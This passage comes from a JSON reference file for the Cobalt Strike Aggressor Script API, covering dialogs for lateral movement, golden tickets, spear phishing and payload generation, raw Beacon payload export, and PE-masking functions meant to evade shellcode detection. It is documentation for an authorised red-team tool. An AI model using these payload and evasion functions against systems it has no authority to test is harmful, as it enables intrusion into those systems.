    "description": "Add a top-level item to the menubar.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the description"
      },
      {
        "param": "$2",
        "desc": "the popup hook"
      }
    ],
    "returns": "",
    "example": "popup mythings {\nitem \"Keep out\" {\n}\n}\n\nmenubar(\"My &Things\", \"mythings\");",
    "notes": "",
    "signature": "menubar",
    "anchors": [
      "menubar"
    ]
  },
  "mynick": {
    "description": "Get the nickname associated with the current Cobalt Strike client.",
    "arguments": [],
    "returns": "A string with your nickname.",
    "example": "println(\"I am: \" . mynick());",
    "notes": "",
    "signature": "mynick",
    "anchors": [
      "mynick"
    ]
  },
  "nextTab": {
    "description": "Activate the tab that is to the right of the current tab.",
    "arguments": [],
    "returns": "",
    "example": "bind Ctrl+Right {\nnextTab();\n}",
    "notes": "",
    "signature": "nextTab",
    "anchors": [
      "nextTab"
    ]
  },
  "on": {
    "description": "Register an event handler. This is an alternate to the on keyword.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the name of the event to respond to"
      },
      {
        "param": "$2",
        "desc": "a callback function. Called when the event happens."
      }
    ],
    "returns": "",
    "example": "sub foo {\nblog($1, \"Foo!\");\n}\n\non(\"beacon_initial\", &foo);",
    "notes": "",
    "signature": "on",
    "anchors": [
      "on"
    ]
  },
  "openAboutDialog": {
    "description": "Open the \"About Cobalt Strike\" dialog",
    "arguments": [],
    "returns": "",
    "example": "openAboutDialog();",
    "notes": "",
    "signature": "openAboutDialog",
    "anchors": [
      "openAboutDialog"
    ]
  },
  "openApplicationManager": {
    "description": "Open the application manager (system profiler results) tab.",
    "arguments": [],
    "returns": "",
    "example": "openApplicationManager();",
    "notes": "",
    "signature": "openApplicationManager",
    "anchors": [
      "openApplicationManager"
    ]
  },
  "openAutoRunDialog": {
    "description": "Open the auto run dialog.",
    "arguments": [],
    "returns": "",
    "example": "openAutoRunDialog();",
    "notes": "",
    "signature": "openAutoRunDialog",
    "anchors": [
      "openAutoRunDialog"
    ]
  },
  "openBeaconBrowser": {
    "description": "Open the beacon browser tab.",
    "arguments": [],
    "returns": "",
    "example": "openBeaconBrowser();",
    "notes": "",
    "signature": "openBeaconBrowser",
    "anchors": [
      "openBeaconBrowser"
    ]
  },
  "openBeaconConsole": {
    "description": "Open the console to interact with a Beacon",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID to apply this feature to"
      }
    ],
    "returns": "",
    "example": "item \"Interact\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenBeaconConsole($bid);\n}\n}",
    "notes": "",
    "signature": "openBeaconConsole",
    "anchors": [
      "openBeaconConsole"
    ]
  },
  "openBrowserPivotSetup": {
    "description": "open the browser pivot setup dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID to apply this feature to"
      }
    ],
    "returns": "",
    "example": "item \"Browser Pivoting\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenBrowserPivotSetup($bid);\n}\n}",
    "notes": "",
    "signature": "openBrowserPivotSetup",
    "anchors": [
      "openBrowserPivotSetup"
    ]
  },
  "openBypassUACDialog": {
    "description": "REMOVED Removed in Cobalt Strike 4.1.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "openBypassUACDialog",
    "anchors": [
      "openBypassUACDialog"
    ]
  },
  "openCloneSiteDialog": {
    "description": "Open the dialog for the website clone tool.",
    "arguments": [],
    "returns": "",
    "example": "openCloneSiteDialog();",
    "notes": "",
    "signature": "openCloneSiteDialog",
    "anchors": [
      "openCloneSiteDialog"
    ]
  },
  "openConnectDialog": {
    "description": "Open the connect dialog.",
    "arguments": [],
    "returns": "",
    "example": "openConnectDialog();",
    "notes": "",
    "signature": "openConnectDialog",
    "anchors": [
      "openConnectDialog"
    ]
  },
  "openCovertVPNSetup": {
    "description": "open the Covert VPN setup dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID to apply this feature to"
      }
    ],
    "returns": "",
    "example": "item \"VPN Pivoting\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenCovertVPNSetup($bid);\n}\n}",
    "notes": "",
    "signature": "openCovertVPNSetup",
    "anchors": [
      "openCovertVPNSetup"
    ]
  },
  "openCredentialManager": {
    "description": "Open the credential manager tab.",
    "arguments": [],
    "returns": "",
    "example": "openCredentialManager();",
    "notes": "",
    "signature": "openCredentialManager",
    "anchors": [
      "openCredentialManager"
    ]
  },
  "openDefaultShortcutsDialog": {
    "description": "Open the Default Keyboard Shortcuts dialog. This function does not have any parameters.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "openDefaultShortcutsDialog",
    "anchors": [
      "openDefaultShortcutsDialog"
    ]
  },
  "openDownloadBrowser": {
    "description": "Open the download browser tab",
    "arguments": [],
    "returns": "",
    "example": "openDownloadBrowser();",
    "notes": "",
    "signature": "openDownloadBrowser",
    "anchors": [
      "openDownloadBrowser"
    ]
  },
  "openElevateDialog": {
    "description": "Open the dialog to launch a privilege escalation exploit.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the beacon ID"
      }
    ],
    "returns": "",
    "example": "item \"Elevate\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenElevateDialog($bid);\n}\n}",
    "notes": "",
    "signature": "openElevateDialog",
    "anchors": [
      "openElevateDialog"
    ]
  },
  "openEventLog": {
    "description": "Open the event log.",
    "arguments": [],
    "returns": "",
    "example": "# Example using the dispatch_event aggressor script function\non ready {\n# Send the script console tab to the bottom of the cobalt strike window\ndispatch_event({\n$client = getAggressorClient();\n$tabMgr = [$client getTabManager];\n$console = openEventLog();\n[$tabMgr dockAppTab: $console];\n});\n}",
    "notes": "",
    "signature": "openEventLog",
    "anchors": [
      "openEventLog"
    ]
  },
  "openFileBrowser": {
    "description": "Open the file browser for a Beacon",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID to apply this feature to"
      }
    ],
    "returns": "",
    "example": "item \"Browse Files\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenFileBrowser($bid);\n}\n}",
    "notes": "",
    "signature": "openFileBrowser",
    "anchors": [
      "openFileBrowser"
    ]
  },
  "openGoldenTicketDialog": {
    "description": "open a dialog to help generate a golden ticket",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID to apply this feature to"
      }
    ],
    "returns": "",
    "example": "item \"Golden Ticket\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenGoldenTicketDialog($bid);\n}\n}",
    "notes": "",
    "signature": "openGoldenTicketDialog",
    "anchors": [
      "openGoldenTicketDialog"
    ]
  },
  "openHTMLApplicationDialog": {
    "description": "Open the HTML Application Dialog.",
    "arguments": [],
    "returns": "",
    "example": "openHTMLApplicationDialog();",
    "notes": "",
    "signature": "openHTMLApplicationDialog",
    "anchors": [
      "openHTMLApplicationDialog"
    ]
  },
  "openHostFileDialog": {
    "description": "Open the host file dialog.",
    "arguments": [],
    "returns": "",
    "example": "openHostFileDialog();",
    "notes": "",
    "signature": "openHostFileDialog",
    "anchors": [
      "openHostFileDialog"
    ]
  },
  "openInterfaceManager": {
    "description": "Open the tab to manage Covert VPN interfaces",
    "arguments": [],
    "returns": "",
    "example": "openInterfaceManager();",
    "notes": "",
    "signature": "openInterfaceManager",
    "anchors": [
      "openInterfaceManager"
    ]
  },
  "openJavaSignedAppletDialog": {
    "description": "Open the Java Signed Applet dialog",
    "arguments": [],
    "returns": "",
    "example": "openJavaSignedAppletDialog();",
    "notes": "",
    "signature": "openJavaSignedAppletDialog",
    "anchors": [
      "openJavaSignedAppletDialog"
    ]
  },
  "openJavaSmartAppletDialog": {
    "description": "Open the Java Smart Applet dialog",
    "arguments": [],
    "returns": "",
    "example": "openJavaSmartAppletDialog();",
    "notes": "",
    "signature": "openJavaSmartAppletDialog",
    "anchors": [
      "openJavaSmartAppletDialog"
    ]
  },
  "openJobBrowser": {
    "description": "Open the job browser tab.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the array of bids."
      }
    ],
    "returns": "",
    "example": "openJobBrowser(@($bid)) # open job browser for one Beacon\nopenJobBrowser(@($bid1, $bid2)) # open job browser for multiple Beacon\nopenJobBrowser() # open job browser for all beacons",
    "notes": "",
    "signature": "openJobBrowser",
    "anchors": [
      "openJobBrowser"
    ]
  },
  "openJobConsole": {
    "description": "Open the console to the job output.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon id."
      },
      {
        "param": "$2",
        "desc": "the Job id."
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "openJobConsole",
    "anchors": [
      "openJobConsole"
    ]
  },
  "openJumpDialog": {
    "description": "Open Cobalt Strike's lateral movement dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "the type of lateral movement. See &beacon_remote_exploits for a list of options. ssh and ssh-key are options too."
      },
      {
        "param": "$2",
        "desc": "an array of targets to apply this action against"
      }
    ],
    "returns": "",
    "example": "openJumpDialog(\"psexec_psh\", @(\"192.168.1.3\", \"192.168.1.4\"));",
    "notes": "",
    "signature": "openJumpDialog",
    "anchors": [
      "openJumpDialog"
    ]
  },
  "openKeystrokeBrowser": {
    "description": "Open the keystroke browser tab",
    "arguments": [],
    "returns": "",
    "example": "openKeystrokeBrowser();",
    "notes": "",
    "signature": "openKeystrokeBrowser",
    "anchors": [
      "openKeystrokeBrowser"
    ]
  },
  "openListenerManager": {
    "description": "Open the listener manager",
    "arguments": [],
    "returns": "",
    "example": "openListenerManager();",
    "notes": "",
    "signature": "openListenerManager",
    "anchors": [
      "openListenerManager"
    ]
  },
  "openMakeTokenDialog": {
    "description": "Open a dialog to help generate an access token.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID to apply this feature to"
      }
    ],
    "returns": "",
    "example": "item \"Make Token\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenMakeTokenDialog($bid);\n}\n}",
    "notes": "",
    "signature": "openMakeTokenDialog",
    "anchors": [
      "openMakeTokenDialog"
    ]
  },
  "openMalleableProfileDialog": {
    "description": "Open the malleable C2 profile dialog.",
    "arguments": [],
    "returns": "",
    "example": "openMalleableProfileDialog();",
    "notes": "",
    "signature": "openMalleableProfileDialog",
    "anchors": [
      "openMalleableProfileDialog"
    ]
  },
  "openOfficeMacro": {
    "description": "Open the office macro export dialog",
    "arguments": [],
    "returns": "",
    "example": "openOfficeMacroDialog();",
    "notes": "",
    "signature": "openOfficeMacroDialog",
    "anchors": [
      "openOfficeMacro"
    ]
  },
  "openOneLinerDialog": {
    "description": "Open the dialog to generate a PowerShell one-liner for this specific Beacon session.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the beacon ID"
      }
    ],
    "returns": "",
    "example": "item \"&One-liner\" {\nopenOneLinerDialog($1);\n}",
    "notes": "",
    "signature": "openOneLinerDialog",
    "anchors": [
      "openOneLinerDialog"
    ]
  },
  "openOrActivate": {
    "description": "If a Beacon console exists, make it active. If a Beacon console does not exist, open it.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID"
      }
    ],
    "returns": "",
    "example": "item \"&Activate\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenOrActivate($bid);\n}\n}",
    "notes": "",
    "signature": "openOrActivate",
    "anchors": [
      "openOrActivate"
    ]
  },
  "openPayloadGeneratorDialog": {
    "description": "Open the Payload Generator dialog.",
    "arguments": [],
    "returns": "",
    "example": "openPayloadGeneratorDialog();",
    "notes": "",
    "signature": "openPayloadGeneratorDialog",
    "anchors": [
      "openPayloadGeneratorDialog"
    ]
  },
  "openPayloadGeneratorStageDialog": {
    "description": "Open the Payload Generator Stageless dialog.",
    "arguments": [],
    "returns": "",
    "example": "openPayloadGeneratorStageDialog();",
    "notes": "",
    "signature": "openPayloadGeneratorStageDialog",
    "anchors": [
      "openPayloadGeneratorStageDialog"
    ]
  },
  "openPayloadHelper": {
    "description": "Open a payload chooser dialog.",
    "arguments": [
      {
        "param": "$1",
        "desc": "a callback function. Arguments: $1 - the selected listener."
      }
    ],
    "returns": "",
    "example": "openPayloadHelper(lambda({\nbspawn($bid, $1);\n}, $bid => $1));",
    "notes": "",
    "signature": "openPayloadHelper",
    "anchors": [
      "openPayloadHelper"
    ]
  },
  "openPivotListenerSetup": {
    "description": "open the pivot listener setup dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID to apply this feature to"
      }
    ],
    "returns": "",
    "example": "item \"Listener...\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenPivotListenerSetup($bid);\n}\n}",
    "notes": "",
    "signature": "openPivotListenerSetup",
    "anchors": [
      "openPivotListenerSetup"
    ]
  },
  "openPortScanner": {
    "description": "Open the port scanner dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "an array of targets to scan"
      }
    ],
    "returns": "",
    "example": "openPortScanner(@(\"192.168.1.3\"));",
    "notes": "",
    "signature": "openPortScanner",
    "anchors": [
      "openPortScanner"
    ]
  },
  "openPortScannerLocal": {
    "description": "Open the port scanner dialog with options to target a Beacon's local network",
    "arguments": [
      {
        "param": "$1",
        "desc": "the beacon to target with this feature"
      }
    ],
    "returns": "",
    "example": "item \"Scan\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenPortScannerLocal($bid);\n}\n}",
    "notes": "",
    "signature": "openPortScannerLocal",
    "anchors": [
      "openPortScannerLocal"
    ]
  },
  "openPowerShellWebDialog": {
    "description": "Open the dialog to setup the PowerShell Web Delivery Attack",
    "arguments": [],
    "returns": "",
    "example": "openPowerShellWebDialog();",
    "notes": "",
    "signature": "openPowerShellWebDialog",
    "anchors": [
      "openPowerShellWebDialog"
    ]
  },
  "openPreferencesDialog": {
    "description": "Open the preferences dialog",
    "arguments": [],
    "returns": "",
    "example": "openPreferencesDialog();",
    "notes": "",
    "signature": "openPreferencesDialog",
    "anchors": [
      "openPreferencesDialog"
    ]
  },
  "openProcessBrowser": {
    "description": "Open a process browser for one or more Beacons",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "item \"Processes\" {\nopenProcessBrowser($1);\n}",
    "notes": "",
    "signature": "openProcessBrowser",
    "anchors": [
      "openProcessBrowser"
    ]
  },
  "openSOCKSBrowser": {
    "description": "Open the tab to list SOCKS proxy servers",
    "arguments": [],
    "returns": "",
    "example": "openSOCKSBrowser();",
    "notes": "",
    "signature": "openSOCKSBrowser",
    "anchors": [
      "openSOCKSBrowser"
    ]
  },
  "openSOCKSSetup": {
    "description": "open the SOCKS proxy server setup dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID to apply this feature to"
      }
    ],
    "returns": "",
    "example": "item \"SOCKS Server\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenSOCKSSetup($bid);\n}\n}",
    "notes": "",
    "signature": "openSOCKSSetup",
    "anchors": [
      "openSOCKSSetup"
    ]
  },
  "openScreenshotBrowser": {
    "description": "Open the screenshot browser tab",
    "arguments": [],
    "returns": "",
    "example": "openScreenshotBrowser();",
    "notes": "",
    "signature": "openScreenshotBrowser",
    "anchors": [
      "openScreenshotBrowser"
    ]
  },
  "openScriptConsole": {
    "description": "Open the Aggressor Script console.",
    "arguments": [],
    "returns": "",
    "example": "# Example using the dispatch_event aggressor script function\non ready {\n# Send the script console tab to the bottom of the cobalt strike window\ndispatch_event({\n$client = getAggressorClient();\n$tabMgr = [$client getTabManager];\n$console = openScriptConsole();\n[$tabMgr dockAppTab: $console];\n});\n}",
    "notes": "",
    "signature": "openScriptConsole",
    "anchors": [
      "openScriptConsole"
    ]
  },
  "openScriptManager": {
    "description": "Open the tab for the script manager.",
    "arguments": [],
    "returns": "",
    "example": "openScriptManager();",
    "notes": "",
    "signature": "openScriptManager",
    "anchors": [
      "openScriptManager"
    ]
  },
  "openScriptedWebDialog": {
    "description": "Open the dialog to setup a Scripted Web Delivery Attack",
    "arguments": [],
    "returns": "",
    "example": "openScriptedWebDialog();",
    "notes": "",
    "signature": "openScriptedWebDialog",
    "anchors": [
      "openScriptedWebDialog"
    ]
  },
  "openServiceBrowser": {
    "description": "Open service browser tab.",
    "arguments": [
      {
        "param": "$1",
        "desc": "an array of targets to show services for"
      }
    ],
    "returns": "",
    "example": "openServiceBrowser(@(\"192.168.1.3\"));",
    "notes": "",
    "signature": "openServiceBrowser",
    "anchors": [
      "openServiceBrowser"
    ]
  },
  "openSiteManager": {
    "description": "Open the site manager.",
    "arguments": [],
    "returns": "",
    "example": "openSiteManager();",
    "notes": "",
    "signature": "openSiteManager",
    "anchors": [
      "openSiteManager"
    ]
  },
  "openSpawnAsDialog": {
    "description": "Open dialog to spawn a payload as another user",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID to apply this feature to"
      }
    ],
    "returns": "",
    "example": "item \"Spawn As...\" {\nlocal('$bid');\nforeach $bid ($1) {\nopenSpawnAsDialog($bid);\n}\n}",
    "notes": "",
    "signature": "openSpawnAsDialog",
    "anchors": [
      "openSpawnAsDialog"
    ]
  },
  "openSpawnDialog": {
    "description": "Open dialog to spawn a payload.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "item \"&Spawn\" {\nopenSpawnDialog($1);\n}",
    "notes": "",
    "signature": "openSpawnDialog",
    "anchors": [
      "openSpawnDialog"
    ]
  },
  "openSpearPhishDialog": {
    "description": "Open the dialog for the spear phishing tool.",
    "arguments": [],
    "returns": "",
    "example": "openSpearPhishDialog();",
    "notes": "",
    "signature": "openSpearPhishDialog",
    "anchors": [
      "openSpearPhishDialog"
    ]
  },
  "openSystemInformationDialog": {
    "description": "Open the system information dialog.",
    "arguments": [],
    "returns": "",
    "example": "openSystemInformationDialog();",
    "notes": "",
    "signature": "openSystemInformationDialog",
    "anchors": [
      "openSystemInformationDialog"
    ]
  },
  "openSystemProfilerDialog": {
    "description": "Open the dialog to setup the system profiler.",
    "arguments": [],
    "returns": "",
    "example": "openSystemProfilerDialog();",
    "notes": "",
    "signature": "openSystemProfilerDialog",
    "anchors": [
      "openSystemProfilerDialog"
    ]
  },
  "openTargetBrowser": {
    "description": "Open the targets browser",
    "arguments": [],
    "returns": "",
    "example": "openTargetBrowser();",
    "notes": "",
    "signature": "openTargetBrowser",
    "anchors": [
      "openTargetBrowser"
    ]
  },
  "openWebLog": {
    "description": "Open the web log tab.",
    "arguments": [],
    "returns": "",
    "example": "# Example using the dispatch_event aggressor script function\non ready {\n# Send the script console tab to the bottom of the cobalt strike window\ndispatch_event({\n$client = getAggressorClient();\n$tabMgr = [$client getTabManager];\n$console = openWebLog();\n[$tabMgr dockAppTab: $console];\n});\n}",
    "notes": "",
    "signature": "openWebLog",
    "anchors": [
      "openWebLog"
    ]
  },
  "openWindowsDropperDialog": {
    "description": "REMOVED Removed in Cobalt Strike 4.0.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "openWindowsDropperDialog",
    "anchors": [
      "openWindowsDropperDialog"
    ]
  },
  "openWindowsExecutableDialog": {
    "description": "Open the dialog to generate a Windows executable.",
    "arguments": [],
    "returns": "",
    "example": "openWindowsExecutableDialog();",
    "notes": "",
    "signature": "openWindowsExecutableDialog",
    "anchors": [
      "openWindowsExecutableDialog"
    ]
  },
  "openWindowsExecutableStage": {
    "description": "Open the dialog to generate a stageless Windows executable.",
    "arguments": [],
    "returns": "",
    "example": "openWindowsExecutableStageDialog();",
    "notes": "",
    "signature": "openWindowsExecutableStageDialog",
    "anchors": [
      "openWindowsExecutableStage"
    ]
  },
  "openWindowsExecutableStageAllDialog": {
    "description": "Open the dialog to generate all of the stageless payloads (in x86 and x64) for all of the configured listeners. This dialog can also be found in the UI menu under Payloads -> Windows Stageless Generate all Payloads.",
    "arguments": [],
    "returns": "",
    "example": "openWindowsExecutableStageAllDialog();",
    "notes": "",
    "signature": "openWindowsExecutableStageAllDialog",
    "anchors": [
      "openWindowsExecutableStageAllDialog"
    ]
  },
  "payload": {
    "description": "Exports a raw payload for a specific Cobalt Strike listener.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "x86|x64 the architecture of the payload"
      },
      {
        "param": "$3",
        "desc": "exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process."
      },
      {
        "param": "$4",
        "desc": "A string value for the system call method. Valid values are:"
      },
      {
        "param": "$5",
        "desc": "(optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string)."
      },
      {
        "param": "$6",
        "desc": "(optional) DNS Comm Mode Override. Use this to change the DNS Comm Mode from the default mode defined in Malleable C2 (dns|dns_over_https|$null|blank string)."
      }
    ],
    "returns": "A scalar containing position-independent code for the specified listener.",
    "example": "$data = payload(\"my-listener\", \"x86\", \"process\", \"Direct\");\n\n$handle = openf(\">out.bin\");\nwriteb($handle, $data);\nclosef($handle);",
    "notes": "",
    "signature": "payload",
    "anchors": [
      "payload"
    ]
  },
  "payload_bootstrap_hint": {
    "description": "Get the offset to function pointer hints used by Beacon's Reflective Loader. Populate these hints with the asked-for process addresses to have Beacon load itself into memory in a more OPSEC-safe way.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the payload position-independent code (specifically, Beacon)"
      },
      {
        "param": "$2",
        "desc": "the function to get the patch location for"
      }
    ],
    "returns": "The offset to a memory location to patch with a pointer for a specific function used by Beacon's Reflective Loader.",
    "example": "",
    "notes": "- Cobalt Strike's Beacon has a protocol to accept artifact-provided function pointers for functions required by Beacon's Reflective Loader. The protocol is to patch the location of GetProcAddress and GetModuleHandleA into the Beacon DLL. Use of this protocol allows Beacon to load itself in memory without triggering shellcode detection heuristics that monitor reads of kernel32's Export Address Table. This protocol is optional. Artifacts that don't follow this protocol will fallback to resolving key functions via the Export Address Table.\n\n- The Artifact Kit and Resource Kit both implement this protocol. Download these kits to see how to use this function.",
    "signature": "payload_bootstrap_hint",
    "anchors": [
      "payload_bootstrap_hint"
    ]
  },
  "payload_local": {
    "description": "Exports a raw payload for a specific Cobalt Strike listener. Use this function when you plan to spawn this payload from another Beacon session. Cobalt Strike will generate a payload that embeds key function pointers, needed to bootstrap the agent, taken from the parent session's metadata.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the parent Beacon session ID"
      },
      {
        "param": "$2",
        "desc": "the listener name"
      },
      {
        "param": "$3",
        "desc": "x86|x64 the architecture of the payload"
      },
      {
        "param": "$4",
        "desc": "exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process."
      },
      {
        "param": "$5",
        "desc": "A string value for the system call method. Valid values are:"
      },
      {
        "param": "$6",
        "desc": "(optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string)."
      }
    ],
    "returns": "A scalar containing position-independent code for the specified listener.",
    "example": "$data = payload_local($bid, \"my-listener\", \"x86\", \"process\", \"None\");\n\n$handle = openf(\">out.bin\");\nwriteb($handle, $data);\nclosef($handle);",
    "notes": "",
    "signature": "payload_local",
    "anchors": [
      "payload_local"
    ]
  },
  "pe_insert_rich_header": {
    "description": "Insert rich header data into Beacon DLL Content. If there is existing rich header information, it will be replaced.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Rich header"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# -------------------------------------\n# Insert (replace) rich header\n# -------------------------------------\n$rich_header = \"<your rich header info>\";\n$temp_dll = pe_insert_rich_header($temp_dll, $rich_header);",
    "notes": "The rich header length should be on a 4 byte boundary for subsequent checksum calculations.",
    "signature": "pe_insert_rich_header",
    "anchors": [
      "pe_insert_rich_header"
    ]
  },
  "pe_mask": {
    "description": "Mask data in the Beacon DLL Content based on position and length.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Start location"
      },
      {
        "param": "$3",
        "desc": "Length to mask"
      },
      {
        "param": "$4",
        "desc": "Byte value mask key (int)"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# ===========================================================================\n# $1 = Beacon DLL content\n# ===========================================================================\nsub demo_pe_mask {\n\nlocal('$temp_dll, $start, $length, $maskkey');\nlocal('%pemap');\nlocal('@loc_en, @val_en');\n\n$temp_dll = $1;\n\n# -------------------------------------\n# Inspect the current DLL...\n# -------------------------------------\n%pemap = pedump($temp_dll);\n@loc_en = values(%pemap, @(\"Export.Name.\"));\n@val_en = values(%pemap, @(\"Export.Name.\"));\n\nif (size(@val_en) != 1) {\nwarn(\"Unexpected size of export name value array: \" . size(@val_en));\n} else {\nwarn(\"Current export value: \" . @val_en[0]);\n}\n\nif (size(@loc_en) != 1) {\nwarn(\"Unexpected size of export location array: \" . size(@loc_en));\n} else {\nwarn(\"Current export name location: \" . @loc_en[0]);\n}\n\n# -------------------------------------\n# Set parameters (parse number as base 10)\n# -------------------------------------\n$start = parseNumber(@loc_en[0], 10);\n$length = 4;\n$maskkey = 22;\n\n# -------------------------------------\n# mask some data in a dll\n# -------------------------------------\n# warn(\"pe_mask(dll, \" . $start . \", \" . $length . \", \" . $maskkey . \")\");\n$temp_dll = pe_mask($temp_dll, $start, $length, $maskkey);\n\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# un-mask (running the same mask a second time should \"un-mask\")\n# (This would normally be done by the reflective loader)\n# -------------------------------------\n# warn(\"pe_mask(dll, \" . $start . \", \" . $length . \", \" . $maskkey . \")\");\n# $temp_dll = pe_mask($temp_dll, $start, $length, $maskkey);\n\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_mask",
    "anchors": [
      "pe_mask"
    ]
  },
  "pe_mask_section": {
    "description": "Mask data in the Beacon DLL Content based on position and length.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Section name"
      },
      {
        "param": "$3",
        "desc": "Byte value mask key (int)"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# ===========================================================================\n# $1 = Beacon DLL content\n# ===========================================================================\nsub demo_pe_mask_section {\n\nlocal('$temp_dll, $section_name, $maskkey');\nlocal('@loc_en, @val_en');\n\n$temp_dll = $1;\n\n# -------------------------------------\n# Set parameters\n# -------------------------------------\n$section_name = \".text\";\n$maskkey = 23;\n\n# -------------------------------------\n# mask a section in a dll\n# -------------------------------------\n# warn(\"pe_mask_section(dll, \" . $section_name . \", \" . $maskkey . \")\");\n$temp_dll = pe_mask_section($temp_dll, $section_name, $maskkey);\n\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# un-mask (running the same mask a second time should \"un-mask\")\n# (This would normally be done by the reflective loader)\n# -------------------------------------\n# warn(\"pe_mask_section(dll, \" . $section_name . \", \" . $maskkey . \")\");\n# $temp_dll = pe_mask_section($temp_dll, $section_name, $maskkey);\n\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_mask_section",
    "anchors": [
      "pe_mask_section"
    ]
  },
  "pe_mask_string": {
    "description": "Mask a string in the Beacon DLL Content based on position.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Start location"
      },
      {
        "param": "$3",
        "desc": "Byte value mask key (int)"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# ===========================================================================\n# $1 = Beacon DLL content\n# ===========================================================================\nsub demo_pe_mask_string {\n\nlocal('$temp_dll, $location, $length, $maskkey');\nlocal('%pemap');\nlocal('@loc);\n\n$temp_dll = $1;\n\n# -------------------------------------\n# Inspect the current DLL...\n# -------------------------------------\n%pemap = pedump($temp_dll);\n@loc = values(%pemap, @(\"Sections.AddressOfName.0.\"));\n\nif (size(@loc) != 1) {\nwarn(\"Unexpected size of section name location array: \" . size(@loc));\n} else {\nwarn(\"Current section name location: \" . @loc[0]);\n}\n\n# -------------------------------------\n# Set parameters\n# -------------------------------------\n$location = @loc[0];\n$length = 5;\n$maskkey = 23;\n\n# -------------------------------------\n# pe_mask_string (mask a string in a dll)\n# -------------------------------------\n# warn(\"pe_mask_string(dll, \" . $location . \", \" . $maskkey . \")\");\n$temp_dll = pe_mask_string($temp_dll, $location, $maskkey);\n\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# un-mask (running the same mask a second time should \"un-mask\")\n# we are unmasking the length of the string and the null character\n# (This would normally be done by the reflective loader)\n# -------------------------------------\n# warn(\"pe_mask(dll, \" . $location . \", \" . $length . \", \" . $maskkey . \")\");\n# $temp_dll = pe_mask($temp_dll, $location, $length, $maskkey);\n\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_mask_string",
    "anchors": [
      "pe_mask_string"
    ]
  },
  "pe_patch_code": {
    "description": "Patch code in the Beacon DLL Content based on find/replace in '.text' section'.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "byte array to find for resolve offset"
      },
      {
        "param": "$3",
        "desc": "byte array place at resolved offset (overwrite data)"
      }
    ],
    "returns": "Updated DLL Content",
